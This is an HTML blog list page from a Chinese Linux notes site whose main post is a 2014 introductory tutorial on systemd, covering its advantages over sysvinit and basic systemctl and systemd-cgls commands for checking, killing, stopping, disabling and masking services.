<!doctype html>
<html lang="zh-Hans" dir="ltr" class="blog-wrapper blog-list-page plugin-blog plugin-id-default" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.8.1">
<title data-rh="true">Blog | 老司机的文档集</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:url" content="https://itxx00.github.io/notes/blog/page/4"><meta data-rh="true" property="og:locale" content="zh_Hans"><meta data-rh="true" name="docusaurus_locale" content="zh-Hans"><meta data-rh="true" name="docsearch:language" content="zh-Hans"><meta data-rh="true" property="og:title" content="Blog | 老司机的文档集"><meta data-rh="true" name="description" content="Blog"><meta data-rh="true" property="og:description" content="Blog"><meta data-rh="true" name="docusaurus_tag" content="blog_posts_list"><meta data-rh="true" name="docsearch:docusaurus_tag" content="blog_posts_list"><link data-rh="true" rel="icon" href="/notes/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://itxx00.github.io/notes/blog/page/4"><link data-rh="true" rel="alternate" href="https://itxx00.github.io/notes/blog/page/4" hreflang="zh-Hans"><link data-rh="true" rel="alternate" href="https://itxx00.github.io/notes/blog/page/4" hreflang="x-default"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"Blog","@id":"https://itxx00.github.io/notes/blog/page/4","mainEntityOfPage":"https://itxx00.github.io/notes/blog/page/4","headline":"Blog","description":"Blog","blogPost":[{"@type":"BlogPosting","@id":"https://itxx00.github.io/notes/blog/2014/04/08/systemd-basic-usage","mainEntityOfPage":"https://itxx00.github.io/notes/blog/2014/04/08/systemd-basic-usage","url":"https://itxx00.github.io/notes/blog/2014/04/08/systemd-basic-usage","headline":"Systemd基本使用介绍","name":"Systemd基本使用介绍","description":"","datePublished":"2014-04-08T00:00:00.000Z","author":[],"keywords":[]},{"@type":"BlogPosting","@id":"https://itxx00.github.io/notes/blog/2013/11/12/use-fpm2-to-manage-password","mainEntityOfPage":"https://itxx00.github.io/notes/blog/2013/11/12/use-fpm2-to-manage-password","url":"https://itxx00.github.io/notes/blog/2013/11/12/use-fpm2-to-manage-password","headline":"使用fpm2来管理ssh密码","name":"使用fpm2来管理ssh密码","description":"","datePublished":"2013-11-12T00:00:00.000Z","author":[],"keywords":[]},{"@type":"BlogPosting","@id":"https://itxx00.github.io/notes/blog/2013/11/11/centos-multi-network-interface-route","mainEntityOfPage":"https://itxx00.github.io/notes/blog/2013/11/11/centos-multi-network-interface-route","url":"https://itxx00.github.io/notes/blog/2013/11/11/centos-multi-network-interface-route","headline":"CentOS中双网卡静态路由配置","name":"CentOS中双网卡静态路由配置","description":"演示如何为双网卡配置独立的路由规则","datePublished":"2013-11-11T00:00:00.000Z","author":[],"keywords":[]},{"@type":"BlogPosting","@id":"https://itxx00.github.io/notes/blog/2013/10/01/libvirt-basic-usage","mainEntityOfPage":"https://itxx00.github.io/notes/blog/2013/10/01/libvirt-basic-usage","url":"https://itxx00.github.io/notes/blog/2013/10/01/libvirt-basic-usage","headline":"libvirt中的网络管理实践","name":"libvirt中的网络管理实践","description":"","datePublished":"2013-10-01T00:00:00.000Z","author":[],"keywords":[]},{"@type":"BlogPosting","@id":"https://itxx00.github.io/notes/blog/2013/05/17/bash-shell-exit-code","mainEntityOfPage":"https://itxx00.github.io/notes/blog/2013/05/17/bash-shell-exit-code","url":"https://itxx00.github.io/notes/blog/2013/05/17/bash-shell-exit-code","headline":"正确使用shell返回值","name":"正确使用shell返回值","description":"about shell exit code","datePublished":"2013-05-17T00:00:00.000Z","author":[],"keywords":[]},{"@type":"BlogPosting","@id":"https://itxx00.github.io/notes/blog/2013/03/14/ovirt-stateless","mainEntityOfPage":"https://itxx00.github.io/notes/blog/2013/03/14/ovirt-stateless","url":"https://itxx00.github.io/notes/blog/2013/03/14/ovirt-stateless","headline":"Ovirt中的stateless实现机制分析","name":"Ovirt中的stateless实现机制分析","description":"简单分析ovirt的stateless实现机制","datePublished":"2013-03-14T00:00:00.000Z","author":[],"keywords":[]},{"@type":"BlogPosting","@id":"https://itxx00.github.io/notes/blog/2013/03/01/libvirt-tc-bandwidth-control","mainEntityOfPage":"https://itxx00.github.io/notes/blog/2013/03/01/libvirt-tc-bandwidth-control","url":"https://itxx00.github.io/notes/blog/2013/03/01/libvirt-tc-bandwidth-control","headline":"使用libvirt和tc实现vm带宽控制","name":"使用libvirt和tc实现vm带宽控制","description":"","datePublished":"2013-03-01T00:00:00.000Z","author":[],"keywords":[]},{"@type":"BlogPosting","@id":"https://itxx00.github.io/notes/blog/2012/11/23/libvirt-snapshot-blockcommit-blockpull","mainEntityOfPage":"https://itxx00.github.io/notes/blog/2012/11/23/libvirt-snapshot-blockcommit-blockpull","url":"https://itxx00.github.io/notes/blog/2012/11/23/libvirt-snapshot-blockcommit-blockpull","headline":"浅析qcow2镜像文件的快照合并","name":"浅析qcow2镜像文件的快照合并","description":"show how to create snapshot with libvirt and qemu-img.","datePublished":"2012-11-23T00:00:00.000Z","author":[],"keywords":[]},{"@type":"BlogPosting","@id":"https://itxx00.github.io/notes/blog/2012/11/12/msf-study-note","mainEntityOfPage":"https://itxx00.github.io/notes/blog/2012/11/12/msf-study-note","url":"https://itxx00.github.io/notes/blog/2012/11/12/msf-study-note","headline":"metasploit学习笔记","name":"metasploit学习笔记","description":"msf study note","datePublished":"2012-11-12T00:00:00.000Z","author":[],"keywords":[]},{"@type":"BlogPosting","@id":"https://itxx00.github.io/notes/blog/2012/07/13/libvirt-storage-pool","mainEntityOfPage":"https://itxx00.github.io/notes/blog/2012/07/13/libvirt-storage-pool","url":"https://itxx00.github.io/notes/blog/2012/07/13/libvirt-storage-pool","headline":"libvirt中storage pool的管理","name":"libvirt中storage pool的管理","description":"build storage pool with libvirt","datePublished":"2012-07-13T00:00:00.000Z","author":[],"keywords":[]}]}</script><link rel="alternate" type="application/rss+xml" href="/notes/blog/rss.xml" title="老司机的文档集 RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/notes/blog/atom.xml" title="老司机的文档集 Atom Feed"><link rel="stylesheet" href="/notes/assets/css/styles.885bf891.css">
<script src="/notes/assets/js/runtime~main.625c9e29.js" defer="defer"></script>
<script src="/notes/assets/js/main.8b1fdf72.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<svg xmlns="http://www.w3.org/2000/svg" style="display: none;"><defs>
<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t="light";var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",e||t),document.documentElement.setAttribute("data-theme-choice",e||t)}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><div role="region" aria-label="跳到主要内容"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">跳到主要内容</a></div><nav aria-label="主导航" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><button aria-label="切换导航栏" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/notes/"><div class="navbar__logo"><img src="https://github.com/itxx00.png" alt="老司机" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="https://github.com/itxx00.png" alt="老司机" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">老司机</b></a><a class="navbar__item navbar__link" href="/notes/docs/intro">教程</a><a class="navbar__item navbar__link" href="/notes/blog/archive/">历史博文</a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/notes/blog">博客</a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><a href="https://github.com/itxx00/notes" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="system mode" aria-label="切换浅色/暗黑模式（当前为system mode）"><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill="currentColor" d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="container margin-vert--lg"><div class="row"><aside class="col col--3"><nav class="sidebar_re4s thin-scrollbar" aria-label="最近博文导航"><div class="sidebarItemTitle_pO2u margin-bottom--md">Recent posts</div><div role="group"><h3 class="yearGroupHeading_rMGB">2025</h3><ul class="sidebarItemList_Yudw clean-list"><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/notes/blog/2025/08/07/k8s-basic">k8s基础知识总结</a></li></ul></div><div role="group"><h3 class="yearGroupHeading_rMGB">2023</h3><ul class="sidebarItemList_Yudw clean-list"><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/notes/blog/2023/12/25/create-loop-lvm">如何通过loop模拟一个lvm逻辑卷</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/notes/blog/2023/02/02/non-root-systemd">普通用户执行systemctl启停服务禁用密码认证</a></li></ul></div><div role="group"><h3 class="yearGroupHeading_rMGB">2022</h3><ul class="sidebarItemList_Yudw clean-list"><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/notes/blog/2022/12/28/influxdb-ql-use-case">influxQL常用语句整理</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/notes/blog/2022/11/08/static-build-jq-fio">mac上使用docker交叉静态编译jq和fio</a></li></ul></div></nav></aside><main class="col col--7"><article class="margin-bottom--xl"><header><h2 class="title_f1Hy"><a href="/notes/blog/2014/04/08/systemd-basic-usage">Systemd基本使用介绍</a></h2><div class="container_mt6G margin-vert--md"><time datetime="2014-04-08T00:00:00.000Z">2014年4月8日</time> · <!-- -->阅读需 12 分钟</div></header><div class="markdown"><blockquote>
<p>但是由于计算机软硬件的不断发展，人们逐渐发现sysvinit所提供的功能已经无法满足当前的需求，服务多年的sysvinit终将过时，于是一些替代的方案开始出现，这其中包括upstart ，systemd等。</p>
</blockquote>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="关于pid-1">关于PID 1<a href="#关于pid-1" class="hash-link" aria-label="关于PID 1的直接链接" title="关于PID 1的直接链接">​</a></h2>
<p>在linux的世界里，第一个启动到用户空间的进程名叫init，其pid为1，init进程启动完毕后，它相当于其他进程的根，负责将其他的服务进程启动起来，最终启动成为一个完整可用的系统。而提供这个init程序的软件名为sysvinit，它在整个linux系统中所担任的角色重要程度无可厚非。但是由于计算机软硬件的不断发展，人们逐渐发现sysvinit所提供的功能已经无法满足当前的需求，服务多年的sysvinit终将过时，于是一些替代的方案开始出现，这其中包括upstart ，systemd等。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="init的责任">init的责任<a href="#init的责任" class="hash-link" aria-label="init的责任的直接 链接" title="init的责任的直接链接">​</a></h2>
<p>为什么说sysvinit会过时呢？我们从用户需求的角度来看不难发现，其实我们对init的最原始最核心需求是，将系统从内核引导至用户空间，而由于现在硬件水平的发展，使得我们在单纯的原始需求之上产生了新的或者更多的需求，那就是不仅要引导系统，而且要快速的引导系统。而早在sysvinit诞生的那个时候启动速度的重要程度似乎不是很高，所以它在这方面显得有些老是很自然的。现在让我们继续思考一下如何才能实现快速引导。试想，当一个系统启动的时候需要启动长长的一列服务，这样的系统启动速度应该不会快到哪里去，如大多数人使用桌面系统的情况一样，一个加快系统启动速度的最直接方法就是减少启动项，把不必要的启动项禁止掉。而另外一个方法则实现起来不像第一个这么简单，那就是并行启动。并行启动可以带来的速度提升显而易见，我们只需要尽可能保证让更多的服务可以并行启动即可。而从其他方面来看sysvinit由于对脚本的依赖导致启动完毕所有服务过程中需要大量的执行外部命令，这一点也将导致引导速度的变慢。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="后起之秀">后起之秀<a href="#后起之秀" class="hash-link" aria-label="后起之秀的直接链接" title="后起之秀的直接链接">​</a></h2>
<p>当一项标准已经无法满足当下发展的需求时，最好的办法是打破陈规让自己变成新的标准。systemd就是这么做的，因为现实的需要它已经不能顾及POSIX标准了，以不至于阻碍其更好的发展，而systemd在设计之初也和苹果的launchd在某些地方不谋而合。尽管在最初的时候这种做法没有得到所有人的认可甚至是惹恼了一些家伙，但是现在看来systemd已经成为了事实上的标准了，现在已经采用systemd 的发行版有fedora，opensuse，debian，ubuntu，rhel7，archlinux等，尽管在systemd的推广过程中发生了很多曲折，但最终大家的选择是一致的---朝着更好的方向发展而不是墨守陈规。
在功能上，systemd不仅仅是解决了现有程序的种种问题，而且包含了大量新的特性，这意味着系统中原本需要的很多组件现在也都可以下岗了，下面来看看systemd的一些特性：</p>
<ul>
<li>服务管理 - 提供了统一的启动/停止/重启/重载 而不再需要编写一大坨脚本来干这种原本就应该十分简单基本且重要的事情，取而代之的是更为简洁的配置文件，这也表示今后的系统中各种service启动控制的统一性，使得daemon服务开发者免于编写各种看上去参差不齐的启动脚本，增加了通用性。</li>
<li>socket管理 - 支持监听socket，这使得socket的监听和服务本身可以相互独立，一方面可以以此提高服务启动速度，另外一方面还可以节约系统开销。</li>
<li>设备管理 - 可以配合udev规则对设备进行管理，还可以配合/etc/fstab文件实现磁盘的挂载管理，甚至实现更高级的自动挂载；</li>
<li>target分组 - 把不同的unit组合起来，组合到同一个target里面，完全取代sysvinit的运行等级的概念；</li>
<li>状态快照 - 可以对当前系统中的unit状态进行快照，这个概念有些类似于系统的休眠与恢复，你可以让系统从一个状态切换进入另外一个状态；</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="systemd管理入门">systemd管理入门<a href="#systemd管理入门" class="hash-link" aria-label="systemd管理入门的直接链接" title="systemd管理入门的直接链接">​</a></h2>
<p>下面我们将通过一些例子来演示一些基本的管理命令，这些命令对于系统管理员来说至关重要。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="1--如何检查启动项">1  如何检查启动项<a href="#1--如何检查启动项" class="hash-link" aria-label="1  如何检查启动项的直接链接" title="1  如何检查启动项的直接链接">​</a></h3>
<p>任何启动项，只要是在系统启动时有被执行到，不论启动成功还是失败，systemd都能够记录下他们的状态，直接执行不带参数的systemctl命令即可观察到，如下：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># systemctl</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">UNIT                                             LOAD   ACTIVE SUB       DESCRIPTION</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">proc-sys-fs-binfmt_misc.automount                loaded active waiting   Arbitrary Executable File Formats File System Aut</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sys-devices-pci...0-backlight-acpi_video1.device loaded active plugged   /sys/devices/pci0000:00/0000:00:01.0/0000:01:00.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sys-devices-pci...0-backlight-acpi_video0.device loaded active plugged   /sys/devices/pci0000:00/0000:00:02.0/backlight/ac</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sys-devices-pci...00-0000:00:19.0-net-em1.device loaded active plugged   82579LM Gigabit Network Connection</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sys-devices-pci...d1.4:1.0-bluetooth-hci0.device loaded active plugged   /sys/devices/pci0000:00/0000:00:1a.0/usb1/1-1/1-1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sys-devices-pci...000:00:1b.0-sound-card0.device loaded active plugged   6 Series/C200 Series Chipset Family High Definiti</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sys-devices-pci...0000:03:00.0-net-wlp3s0.device loaded active plugged   RTL8188CE 802.11b/g/n WiFi Adapter</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sys-devices-pci...-0:0:0:0-block-sda-sda1.device loaded active plugged   ST9500420AS</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sys-devices-pci...-0:0:0:0-block-sda-sda2.device loaded active plugged   ST9500420AS</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sys-devices-pci...-0:0:0:0-block-sda-sda3.device loaded active plugged   ST9500420AS</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sys-devices-pci...-0:0:0:0-block-sda-sda5.device loaded active plugged   ST9500420AS</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sys-devices-pci...-0:0:0:0-block-sda-sda6.device loaded active plugged   ST9500420AS</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sys-devices-pci...-0:0:0:0-block-sda-sda7.device loaded active plugged   LVM PV EKHM59-PY9G-AoRX-Nr9k-nnxN-XxxO-DFcj4N on</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sys-devices-pci...0:0:0-0:0:0:0-block-sda.device loaded active plugged   ST9500420AS</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sys-devices-pci...-1:0:0:0-block-sdb-sdb1.device loaded active plugged   KINGSTON_SVP200S360G</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sys-devices-pci...-1:0:0:0-block-sdb-sdb2.device loaded active plugged   LVM PV rlRqSb-IlQn-DJQi-i7fg-sUV5-3bjI-g2npg7 on</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sys-devices-pci...1:0:0-1:0:0:0-block-sdb.device loaded active plugged   KINGSTON_SVP200S360G</span><br></span></code></pre></div></div>
<p>要检查具体的服务，则使用status选项加上服务名即可，如下：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># systemctl status libvirtd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">libvirtd.service - Virtualization daemon</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   Loaded: loaded (/usr/lib/systemd/system/libvirtd.service; enabled)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   Active: active (running) since 一 2014-04-07 19:10:30 CST; 9min ago</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     Docs: man:libvirtd(8)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">           http://libvirt.org</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> Main PID: 1673 (libvirtd)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   CGroup: /system.slice/libvirtd.service</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">           ├─1673 /usr/sbin/libvirtd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">           └─1804 /sbin/dnsmasq --conf-file=/var/lib/libvirt/dnsmasq/default.conf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">4月 07 19:10:33 localhost.localdomain dnsmasq[1804]: using nameserver 218.6.200.139#53</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">4月 07 19:10:33 localhost.localdomain dnsmasq[1804]: using nameserver 61.139.2.69#53</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">4月 07 19:10:33 localhost.localdomain dnsmasq[1804]: using local addresses only for unqualified names</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">4月 07 19:10:33 localhost.localdomain dnsmasq[1804]: read /etc/hosts - 3 addresses</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">4月 07 19:10:33 localhost.localdomain dnsmasq[1804]: read /var/lib/libvirt/dnsmasq/default.addnhosts - 0 addresses</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">4月 07 19:10:33 localhost.localdomain dnsmasq-dhcp[1804]: read /var/lib/libvirt/dnsmasq/default.hostsfile</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Hint: Some lines were ellipsized, use -l to show in full.</span><br></span></code></pre></div></div>
<p>以上这些信息向我们展示了服务的运行时间，当前状态，相关进程pid，以及最近的有关该服务的日志信息，是不是很方便？</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="2-找出每项服务所对应的进程id">2 找出每项服务所对应的进程id<a href="#2-找出每项服务所对应的进程id" class="hash-link" aria-label="2 找出每项服务所对应的进程id的直接链接" title="2 找出每项服务所对应的进程id的直接链接">​</a></h3>
<p>对于系统管理来说这是最常见的工作，但是在sysvinit时代我们只能借助例如ps命令等来完成，而systemd已经考虑到了系统管理员的需求，于是下面的命令诞生了：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># systemd-cgls</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">├─1 /usr/lib/systemd/systemd --switched-root --system --deserialize 22</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">├─user.slice</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">│ ├─user-1000.slice</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">│ │ ├─session-1.scope</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">│ │ │ ├─1806 gdm-session-worker [pam/gdm-password]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">│ │ │ ├─1820 /usr/bin/gnome-keyring-daemon --daemonize --login</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">│ │ │ ├─1822 gnome-session</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">│ │ │ ├─1830 dbus-launch --sh-syntax --exit-with-session</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">│ │ │ ├─1831 /bin/dbus-daemon --fork --print-pid 4 --print-address 6 --session</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">│ │ │ ├─1858 /usr/libexec/at-spi-bus-launcher</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">│ │ │ ├─1862 /bin/dbus-daemon --config-file=/etc/at-spi2/accessibility.conf --nofork --print-address 3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">│ │ │ ├─1865 /usr/libexec/at-spi2-registryd --use-gnome-session</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">│ │ │ ├─1872 /usr/libexec/gvfsd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">... ...</span><br></span></code></pre></div></div>
<p>现在我们可以很清晰的看到哪项服务启动了哪些进程，对于系统管理来说十分有用；</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="3-如何正确的杀死服务进程">3 如何正确的杀死服务进程<a href="#3-如何正确的杀死服务进程" class="hash-link" aria-label="3 如何正确的杀死服务进程的直接链接" title="3 如何正确的杀死服务进程的直接链接">​</a></h3>
<p>在sysvinit的时代，如果需要结束一个服务及其启动的所有进程，可能会遇到一些糟糕的进程无法正确结束掉，即便是我们使用kill，killall等命令来结束它们，到了systemd的时代一切都变得不一样，systemd号称是第一个能正确的终结一项服务的程序，下面来看看具体如何操作的：</p>
<p><code>systemctl kill crond.service</code></p>
<p>或者指定一个信号发送出去</p>
<p><code>systemctl kill -s SIGKILL crond.service</code></p>
<p>例如可以像这样执行一次reload操作</p>
<p><code>systemctl kill -s HUP --kill-who=main crond.service</code></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="4-如何停止和禁用一项服务">4 如何停止和禁用一项服务<a href="#4-如何停止和禁用一项服务" class="hash-link" aria-label="4 如何停止和禁用一项服务的直接链接" title="4 如何停止和禁用一项服务的直接链接">​</a></h3>
<p>下面我们回顾一下在sysvinit时代执行下面的命令所实现的功能</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># service ntpd stop</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># chkconfig ntpd off</span><br></span></code></pre></div></div>
<p>很简单，首先停止服务，其次禁用服务
那么在systemd中应该如何操作呢？</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># systemctl stop ntpd.service</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># systemdctl disable ntpd.service</span><br></span></code></pre></div></div>
<p>很显然systemctl命令已经取代了service 和chkconfig两个命令的位置，不光如此，我们还能将服务设置为连人工也无法启动：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># ln -s /dev/null  /etc/systemd/system/ntpd.service</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># systemctl daemon-reload</span><br></span></code></pre></div></div>
